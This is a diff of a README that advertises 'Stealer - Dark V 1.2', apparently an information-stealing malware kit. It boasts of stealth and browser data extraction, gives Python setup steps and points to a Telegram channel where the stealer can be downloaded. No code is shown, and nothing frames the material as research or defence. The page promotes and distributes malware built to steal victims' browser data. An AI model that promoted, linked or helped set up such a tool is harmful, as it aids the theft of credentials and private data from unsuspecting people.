@@ -1,11 +1,16 @@
-<img width="856" height="746" alt="Capture12" src="https://github.com/user-attachments/assets/9b592cf0-0f0c-43bc-909f-8fc2c5a195d0" />
- Stealer---Dark-V-1.2
+
+
 Stealer - Dark V 1.2 400+ Powerful Features. Unmatched Stealth
+<img width="856" height="746" alt="Capture12" src="https://github.com/user-attachments/assets/9b592cf0-0f0c-43bc-909f-8fc2c5a195d0" />
+
+Requirements
 install Python 3.11
 pip install -r requirements.txt
 
 
 
+
+Features
 Stealer - Dark V 1.2 400+ Powerful Features. Unmatched Stealth
 downloade Dark-Stealer V 1.2 t.me/DarkStealer404
 #Stealer ⚡️ Browser Data Extraction
